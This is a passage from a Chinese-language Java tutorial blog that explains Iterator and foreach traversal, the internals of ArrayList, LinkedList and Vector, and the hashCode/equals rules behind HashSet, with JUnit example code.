接口遍历集合元素</h2><ul><li><p>Iterator对象称为迭代器(设计模式的一种)，主要用于遍历 Collection 集合中的元素。</p></li><li><p>GOF给迭代器模式的定义为：提供一种方法访问一个容器(container)对象中各个元素，而又不需暴露该对象的内部细节。<strong>迭代器模式，就是为容器而生。</strong>类似于“公交车上的售票员”、“火车上的乘务员”、“空姐”。 </p></li><li><p>Collection接口继承了java.lang.Iterable接口，该接口有一个iterator()方法，那么所有实现了Collection接口的集合类都有一个iterator()方法，用以返回一个实现了Iterator接口的对象。 </p></li><li><p>Iterator 仅用于遍历集合，Iterator 本身并不提供承装对象的能力。如果需要创建Iterator 对象，则必须有一个被迭代的集合。</p></li><li><p>集合对象每次调用iterator()方法都得到一个全新的迭代器对象，默认游标都在集合的第一个元素之前。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 集合元素的遍历操作，使用迭代器Iterator接口</span></span><br><span class="line"><span class="comment"> * 1.内部的方法：hasNext() 和 next()</span></span><br><span class="line"><span class="comment"> * 2.集合对象每次调用iterator()方法都得到一个全新的迭代器对象，</span></span><br><span class="line"><span class="comment"> * 默认游标都在集合的第一个元素之前。</span></span><br><span class="line"><span class="comment"> * 3.内部定义了remove(),可以在遍历的时候，删除集合中的元素。此方法不同于集合直接调用remove()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IteratorTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        coll.add(<span class="number">123</span>);</span><br><span class="line">        coll.add(<span class="number">456</span>);</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>));</span><br><span class="line">        coll.add(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> coll.iterator();</span><br><span class="line">        <span class="comment">//方式一：</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        //报异常：NoSuchElementException</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式二：不推荐</span></span><br><span class="line"><span class="comment">//        for(int i = 0;i &lt; coll.size();i++)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式三：推荐</span></span><br><span class="line">        <span class="comment">////hasNext():判断是否还有下一个元素</span></span><br><span class="line">        <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">            <span class="comment">//next():①指针下移 ②将下移以后集合位置上的元素返回</span></span><br><span class="line">            System.out.println(iterator.next());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        coll.add(<span class="number">123</span>);</span><br><span class="line">        coll.add(<span class="number">456</span>);</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>));</span><br><span class="line">        coll.add(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//错误方式一：</span></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> coll.iterator();</span><br><span class="line">        <span class="keyword">while</span>((iterator.next()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(iterator.next());<span class="comment">//跳着输出，最后报NoSuchElementException异常</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//错误方式二：</span></span><br><span class="line">        <span class="comment">//集合对象每次调用iterator()方法都得到一个全新的迭代器对象，默认游标都在集合的第一个元素之前。</span></span><br><span class="line"><span class="comment">//        while (coll.iterator().hasNext())&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(coll.iterator().next());//循环打出123</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//测试Iterator中的remove()</span></span><br><span class="line">    <span class="comment">//如果还未调用next()或在上一次调用 next 方法之后已经调用了 remove 方法，</span></span><br><span class="line">    <span class="comment">// 再调用remove都会报IllegalStateException。</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        coll.add(<span class="number">123</span>);</span><br><span class="line">        coll.add(<span class="number">456</span>);</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>));</span><br><span class="line">        coll.add(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除集合中&quot;Tom&quot;</span></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> coll.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line"><span class="comment">//            iterator.remove();</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;Tom&quot;</span>.equals(obj))&#123;</span><br><span class="line">                iterator.remove();</span><br><span class="line"><span class="comment">//                iterator.remove();</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历集合</span></span><br><span class="line">        iterator = coll.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">            System.out.println(iterator.next());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>注意：</strong><ul><li>Iterator可以删除集合的元素，但是是遍历过程中通过迭代器对象的remove方法，不是集合对象的remove方法。 </li><li>如果还未调用next()或在上一次调用 next 方法之后已经调用了 remove 方法，再调用remove都会报IllegalStateException。</li></ul></li></ul><h2 id="使用-foreach-循环遍历集合元素"><a href="#使用-foreach-循环遍历集合元素" class="headerlink" title="使用 foreach 循环遍历集合元素"></a>使用 foreach 循环遍历集合元素</h2><ul><li><p>Java 5.0 提供了 foreach 循环迭代访问 <strong>Collection 和 数组</strong>。</p></li><li><p>遍历操作不需获取Collection或数组的长度，无需使用索引访问元素。</p></li><li><p>遍历集合的<strong>底层调用Iterator</strong>完成操作。</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForTest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        coll.add(<span class="number">123</span>);</span><br><span class="line">        coll.add(<span class="number">456</span>);</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>, <span class="number">20</span>));</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>));</span><br><span class="line">        coll.add(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//for(集合元素的类型 局部变量 : 集合对象)</span></span><br><span class="line">        <span class="comment">//内部仍然调用了迭代器。</span></span><br><span class="line">        <span class="keyword">for</span> (Object obj : coll) &#123;</span><br><span class="line">            System.out.println(obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">        <span class="comment">//for(数组元素的类型 局部变量 : 数组对象)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : arr) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//练习题</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">()</span> &#123;</span><br><span class="line">        String[] arr = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;MM&quot;</span>, <span class="string">&quot;MM&quot;</span>, <span class="string">&quot;MM&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        //方式一：普通for赋值</span></span><br><span class="line"><span class="comment">//        for(int i = 0;i &lt; arr.length;i++)&#123;</span></span><br><span class="line"><span class="comment">//            arr[i] = &quot;GG&quot;;//原数组值改变</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式二：增强for循环</span></span><br><span class="line">        <span class="keyword">for</span> (String s : arr) &#123;</span><br><span class="line">            s = <span class="string">&quot;GG&quot;</span>;<span class="comment">//没有改变原数组</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            System.out.println(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="List接口"><a href="#List接口" class="headerlink" title="List接口"></a>List接口</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>List接口框架</strong></p><ul><li>Collection接口：单列集合，用来存储一个一个的对象<ul><li><p>List接口：存储有序的、可重复的数据。  –&gt; <strong>动态</strong>数组,替换原有的数组，<strong>实现类要重写equals()</strong></p><ul><li>ArrayList：List接口的主要实现类；<strong>线程不安全，效率高</strong>；底层使用Object[] elementData存储</li><li>LinkedList：对于频繁的插入、删除操作，使用此类效率比ArrayList高；底层使用双向链表存储</li><li>Vector：List接口的古老实现类；<strong>线程安全，效率低</strong>；底层使用Object[] elementData存储</li></ul></li></ul></li></ul><hr><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p><strong>ArrayList的源码分析：</strong></p><p>  ① jdk 7情况下</p><ul><li><p>ArrayList list &#x3D; new ArrayList(); &#x2F;&#x2F;底层创建了长度是10的Object[]数组elementData</p></li><li><p>list.add(123);&#x2F;&#x2F;elementData[0] &#x3D; new Integer(123);</p></li><li><p>list.add(11);&#x2F;&#x2F;如果此次的添加导致底层elementData数组容量不够，则扩容。</p></li><li><pre><code> 默认情况下，扩容为原来的容量的1.5倍，同时需要将原有数组中的数据复制到新的数组中。</code></pre></li><li><p>结论：建议开发中使用带参的构造器：ArrayList list &#x3D; new ArrayList(int capacity)</p></li></ul><p>  ② jdk 8中ArrayList的变化：</p><ul><li><pre><code> ArrayList list = new ArrayList();//底层Object[] elementData初始化为&#123;&#125;.并没有创建长度为10的数组</code></pre></li><li><p>list.add(123);&#x2F;&#x2F;第一次调用add()时，底层才创建了长度10的数组，并将数据123添加到elementData[0]</p></li><li><p>后续的添加和扩容操作与jdk 7 无异。</p></li></ul><p>小结：jdk7中的ArrayList的对象的创建类似于单例的饿汉式，而jdk8中的ArrayList的对象的创建类似于单例的懒汉式，延迟了数组的创建，<strong>节省内存</strong>。</p><blockquote><p>注意：Arrays.asList(…) 方法返回的 List 集合，既不是 ArrayList 实例，也不是Vector 实例。 Arrays.asList(…) 返回值是一个固定长度的 List 集合。</p></blockquote><hr><p><strong>LinkedList的源码分析：</strong></p><ul><li><p>LinkedList list &#x3D; new LinkedList(); 内部声明了Node类型的first和last属性，默认值为null，没有声明数组</p></li><li><p>list.add(123);  &#x2F;&#x2F;将123封装到Node中，创建了Node对象。</p></li><li><p>其中，Node定义为：</p></li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Node</span>&lt;E&gt; &#123; <span class="comment">// 体现了LinkedList的双向链表的说法</span></span><br><span class="line">    E item;</span><br><span class="line">    Node&lt;E&gt; next;</span><br><span class="line">    Node&lt;E&gt; prev;</span><br><span class="line"></span><br><span class="line">    Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123;</span><br><span class="line">        <span class="built_in">this</span>.item = element;</span><br><span class="line">        <span class="built_in">this</span>.next = next;</span><br><span class="line">        <span class="built_in">this</span>.prev = prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>新增方法：</p><ul><li><p><strong>void addFirst(Object obj)</strong> </p></li><li><p><strong>void addLast(Object obj)</strong> </p></li><li><p><strong>Object getFirst()</strong></p></li><li><p><strong>Object getLast()</strong></p></li><li><p><strong>Object removeFirst()</strong></p></li><li><p><strong>Object removeLast()</strong></p></li></ul></li></ul><hr><p><strong>Vector的源码分析：</strong></p><ul><li><p>jdk7和jdk8中通过Vector()构造器创建对象时，底层都创建了长度为10的数组。</p></li><li><p>在扩容方面，默认扩容为原来的数组长度的2倍。</p></li><li><p>新增方法：</p></li></ul><ul><li><p><strong>void addElement(Object obj)</strong> </p></li><li><p><strong>void insertElementAt(Object obj,int index)</strong></p></li><li><p><strong>void setElementAt(Object obj,int index)</strong></p></li><li><p><strong>void removeElement(Object obj)</strong> </p></li><li><p><strong>void removeAllElements()</strong></p></li></ul><h2 id="接口方法"><a href="#接口方法" class="headerlink" title="接口方法"></a>接口方法</h2><p>List除了从Collection集合继承的方法外，List 集合里添加了一些根据索引来操作集合元素的方法。 </p><ul><li><p>void add(int index, Object ele):在index位置插入ele元素</p></li><li><p>boolean addAll(int index, Collection eles):从index位置开始将eles中的所有元素添加进来</p></li><li><p>Object get(int index):获取指定index位置的元素</p></li><li><p>int indexOf(Object obj):返回obj在集合中首次出现的位置</p></li><li><p>int lastIndexOf(Object obj):返回obj在当前集合中末次出现的位置</p></li><li><p>Object remove(int index):移除指定index位置的元素，并返回此元素</p></li><li><p>Object set(int index, Object ele):设置指定index位置的元素为ele</p></li><li><p>List subList(int fromIndex, int toIndex):返回从fromIndex到toIndex位置的<strong>左闭右开</strong>区间子集合</p></li></ul><p><strong>总结：常用方法</strong></p><blockquote><p>增：add(Object obj)<br>删：remove(int index) &#x2F; remove(Object obj)<br>改：set(int index, Object ele)<br>查：get(int index)<br>插：add(int index, Object ele)<br>长度：size()<br>遍历：① Iterator迭代器方式  ② 增强for循环  ③ 普通的循环</p></blockquote><h2 id="经典面试题"><a href="#经典面试题" class="headerlink" title="经典面试题"></a>经典面试题</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testListRemove</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    list.add(<span class="number">1</span>);</span><br><span class="line">    list.add(<span class="number">2</span>);</span><br><span class="line">    list.add(<span class="number">3</span>);</span><br><span class="line">    updateList(list);</span><br><span class="line">    System.out.println(list);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">updateList</span><span class="params">(List list)</span> &#123;</span><br><span class="line">list.remove(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里考察的是updateList调用的remove方法是Collection接口的方法还是List接口的方法</p><p><code>List:remove(int index) / Collection:remove(Object obj)</code></p><p>这里显然调用的是List的remove方法，删除索引为2的元素，如果想删除元素值为2的元素，则是：</p><p><code>list.remove(new Integer(2))</code></p><hr><p><strong>ArrayList和LinkedList的异同：</strong></p><p>二者都线程不安全，相对线程安全的Vector，执行效率高。</p><p>此外，ArrayList是实现了基于<strong>动态数组</strong>的数据结构，LinkedList基于<strong>链表</strong>的数据结构。对于随机访问get和set，ArrayList绝对优于LinkedList，因为LinkedList要移动指针。对于新增和删除操作add(特指插入)和remove，LinkedList比较占优势，因为ArrayList要移动数据。</p><p><strong>ArrayList和Vector的区别：</strong></p><p>Vector和ArrayList几乎是完全相同的,唯一的区别在于Vector是同步类(synchronized)，属于强同步类。因此开销就比ArrayList要大，访问要慢。正常情况下，大多数的Java程序员使用ArrayList而不是Vector，因为同步完全可以由程序员自己来控制。<strong>Vector每次扩容请求其大小的2倍空间，而ArrayList是1.5倍。</strong>Vector还有一个子类Stack。</p><h1 id="Set接口"><a href="#Set接口" class="headerlink" title="Set接口"></a>Set接口</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><ul><li>Collection接口：单列集合，用来存储一个一个的对象<ul><li>Set接口：存储无序的、不可重复的数据   –&gt;高中讲的“集合”<ul><li>HashSet：作为Set接口的主要实现类；<strong>线程不安全的；可以存储null值</strong>.<ul><li>LinkedHashSet：作为HashSet的子类；遍历其内部数据时，<strong>可以按照添加的顺序遍历</strong>，效率高于HashSet</li></ul></li><li>TreeSet：可以按照添加对象的指定属性，进行<strong>排序</strong>。</li></ul></li></ul></li></ul><blockquote><p>Set接口中没有额外定义新的方法，使用的都是Collection中声明过的方法。</p><p><strong>要求</strong>：向Set(主要指：HashSet、LinkedHashSet)中添加的数据，其所在的类一定要重写hashCode()和equals()，重写的hashCode()和equals()尽可能保持一致性：<strong>相等的对象必须具有相等的散列码</strong>。</p></blockquote><h2 id="hashCode-和-equals"><a href="#hashCode-和-equals" class="headerlink" title="hashCode() 和 equals()"></a>hashCode() 和 equals()</h2><p><strong>重写 hashCode() 方法的基本原则：</strong></p><ol><li><p>在程序运行时，同一个对象多次调用 hashCode() 方法应该返回相同的值。</p></li><li><p>当两个对象的 equals() 方法比较返回 true 时，这两个对象的 hashCode() 方法的返回值也应相等。</p></li><li><p>对象中用作 equals() 方法比较的 Field，都应该用来计算 hashCode 值。</p></li></ol><hr><p><strong>重写 equals() 方法的基本原则：</strong></p><p>以自定义的Customer类为例，何时需要重写equals()？ </p><ol><li><p>默认情况下，也就是从超类Object继承而来的equals方法与‘&#x3D;&#x3D;’是完全等价的，<strong>比较的都是对象的内存地址，</strong>但我们可以重写equals方法，使其按照我们的需求的方式进行比较，如String类重写了equals方法，使其比较的是字符的序列，而不再是内存地址。</p></li><li><p>当一个类有自己特有的“逻辑相等”概念，**当改写equals()的时候，总是要改写hashCode()**。根据一个类的equals方法（只改写了equals()方法），两个截然不同的实例有可能在逻辑上是相等的，但是，根据继承的Object.hashCode()方法，它们仅仅是两个对象。因此，违反了“相等的对象必须具有相等的散列码”，需要重写hashCode方法。</p></li></ol><p> 结论：复写equals方法的时候一般都需要同时复写hashCode方法。通常参与计算hashCode的对象的属性也应该参与到equals()中进行计算。</p><hr><p><strong>Eclipse&#x2F;IDEA工具里hashCode() 和 equals() 的重写</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">      <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) o;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (age != person.age) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">return</span> name != <span class="literal">null</span> ? name.equals(person.name) : person.name == <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> name != <span class="literal">null</span> ? name.hashCode() : <span class="number">0</span>;</span><br><span class="line">      result = <span class="number">31</span> * result + age;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>为什么用Eclipse&#x2F;IDEA复写hashCode方法，有31这个数字？</strong></p><ul><li><p>选择系数的时候要选择尽量大的系数。因为如果计算出来的hash地址越大，所谓的“冲突”就越少，查找起来效率也会提高。（减少冲突）</p></li><li><p>并且31只占用5bits,相乘造成数据溢出的概率较小。</p></li><li><p>31可以 由i*31&#x3D;&#x3D; (i&lt;&lt;5)-1来表示,现在很多虚拟机里面都有做相关优化。（提高算法效率）</p></li><li><p>31是一个素数，素数作用就是如果我用一个数字来乘以这个素数，那么最终出来的结果只能被素数本身和被乘数还有1来整除！(减少冲突)</p></li></ul><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><ul><li><p>HashSet 按 Hash 算法来存储集合中的元素，因此具有很好的存取、查找、删除性能。 </p></li><li><p>HashSet 具有以下特点：</p><ol><li><p>不能保证元素的排列顺序</p></li><li><p>HashSet 不是线程安全的</p></li><li><p>集合元素可以是 null</p></li></ol></li><li><p>HashSet 集合判断两个元素相等的标准：两个对象通过 hashCode() 方法比较相等，并且两个对象的 equals() 方法返回值也相等。</p></li></ul><p><strong>添加元素的过程：</strong></p><ol><li>我们向HashSet中添加元素a,首先调用元素a所在类的hashCode()方法，计算元素a的哈希值，此哈希值接着通过某种散列函数计算出在HashSet底层数组中的存放位置（即为：索引位置）</li><li>判断数组此位置上是否已经有元素：<ul><li>如果此位置上没有其他元素，则元素a添加成功。 —&gt;情况1</li><li>如果此位置上有其他元素b(或以链表形式存在的多个元素），则比较元素a与元素b的hash值：<ul><li>如果hash值不相同，则元素a添加成功。—&gt;情况2</li><li>如果hash值相同，进而需要调用元素a所在类的equals()方法：<br>                   equals()返回true,元素a添加失败<br>                   equals()返回false,则元素a添加成功。—&gt;情况3</li></ul></li></ul></li></ol><p>对于添加成功的情况2和情况3而言：元素a与已经存在指定索引位置上数据<strong>以链表的方式存储。</strong></p><p>jdk 7 :元素a放到数组中，指向数组中原来的元素。<br>jdk 8 :原来的元素在数组中，指向元素a。</p><p><strong>HashSet底层：数组+链表的结构</strong></p><p><code>底层数组，初始容量为16，当如果使用率超过0.75，（16*0.75=12）就会扩大容量为原来的2倍。（16扩容为32，依次为64,128....等）</code></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214947.png"></p><h2 id="LinkedSet"><a 